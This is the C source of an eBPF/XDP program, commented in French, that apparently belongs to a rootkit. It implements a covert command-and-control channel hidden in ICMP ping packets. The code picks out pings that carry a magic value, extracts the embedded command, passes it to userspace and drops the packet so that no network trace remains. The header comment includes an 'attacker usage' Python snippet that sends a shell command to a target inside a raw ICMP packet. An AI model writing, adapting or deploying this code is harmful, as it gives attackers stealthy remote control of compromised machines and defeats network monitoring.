/* SPDX-License-Identifier: GPL-2.0 */
/*
 * Canal C2 covert via ICMP — commandes cachees dans des paquets ping.
 *
 * Ce programme XDP intercepte les paquets ICMP Echo Request dont le
 * payload commence par le magic 0xDEAD1337. La commande contenue dans
 * le reste du payload est extraite et envoyee au userspace via ring buffer.
 * Le paquet ICMP est ensuite DROP pour ne laisser aucune trace.
 *
 * Usage attaquant :
 *   python3 -c "
 *   import struct, socket
 *   s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
 *   # type=8 (echo request), code=0, checksum=0 (kernel recalcule), id=0, seq=0
 *   icmp_hdr = struct.pack('!BBHHH', 8, 0, 0, 0, 0)
 *   magic = struct.pack('!I', 0xDEAD1337)
 *   cmd = b'id > /tmp/.rk_out'
 *   payload = icmp_hdr + magic + cmd
 *   # recalcul checksum
 *   s.sendto(payload, ('<cible>', 0))
 *   "
 */
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_endian.h>
#include "rk_bpf_common.h"

#define ETH_P_IP    0x0800
#define IPPROTO_ICMP 1
#define ICMP_ECHO    8

/* Ring buffer pour transmettre les commandes au userspace */
struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, RK_RINGBUF_SIZE);
} icmp_cmd_events SEC(".maps");

/* Flag pour activer/desactiver le canal C2 */
struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, 1);
    __type(key, __u32);
    __type(value, __u8);
} icmp_c2_enabled SEC(".maps");

SEC("xdp")
int xdp_icmp_c2(struct xdp_md *ctx)
{
    void *data     = (void *)(long)ctx->data;
    void *data_end = (void *)(long)ctx->data_end;

    /* Verifier si le canal C2 est actif */
    __u32 zero = 0;
    __u8 *enabled = bpf_map_lookup_elem(&icmp_c2_enabled, &zero);
    if (!enabled || *enabled == 0)
        return XDP_PASS;

    /* Parse Ethernet */
    struct ethhdr *eth = data;
    if ((void *)(eth + 1) > data_end)
        return XDP_PASS;

    if (eth->h_proto != bpf_htons(ETH_P_IP))
        return XDP_PASS;

    /* Parse IP */
    struct iphdr *ip = (void *)(eth + 1);
    if ((void *)(ip + 1) > data_end)
        return XDP_PASS;

    if (ip->protocol != IPPROTO_ICMP)
        return XDP_PASS;

    /* Parse ICMP */
    struct icmphdr *icmp = (void *)ip + (ip->ihl * 4);
    if ((void *)(icmp + 1) > data_end)
        return XDP_PASS;

    /* On ne s'interesse qu'aux Echo Request */
    if (icmp->type != ICMP_ECHO)
        return XDP_PASS;

    /* Le payload commence apres l'en-tete ICMP (8 octets) */
    void *payload = (void *)icmp + sizeof(struct icmphdr);
    if (payload + RK_ICMP_MAGIC_SIZE > data_end)
        return XDP_PASS;

    /* Verifier le magic */
    __u32 magic = 0;
    __builtin_memcpy(&magic, payload, sizeof(magic));

    if (magic != bpf_htonl(RK_ICMP_MAGIC))
        return XDP_PASS;  /* Ping normal, laisser passer */

    /* C'est un paquet C2 : extraire la commande */
    void *cmd_start = payload + RK_ICMP_MAGIC_SIZE;
    if (cmd_start >= data_end)
        return XDP_DROP;

    if (cmd_start + RK_ICMP_CMD_MAX - 1 > data_end) {
        /* Payload trop court — on copie ce qu'il y a */
    }

    struct icmp_cmd_event *evt;
    evt = bpf_ringbuf_reserve(&icmp_cmd_events, sizeof(*evt), 0);
    if (!evt)
        return XDP_DROP;

    evt->src_ip = ip->saddr;
    __builtin_memset(evt->cmd, 0, sizeof(evt->cmd));

    /* Copie octet par octet avec verification de bornes (verifier-safe) */
    unsigned char *src = (unsigned char *)cmd_start;
    for (int i = 0; i < RK_ICMP_CMD_MAX - 1; i++) {
        if (src + i + 1 > (unsigned char *)data_end)
            break;
        evt->cmd[i] = src[i];
    }

    bpf_ringbuf_submit(evt, 0);

    /* Drop le paquet C2 pour ne laisser aucune trace reseau */
    return XDP_DROP;
}

char LICENSE[] SEC("license") = "GPL";
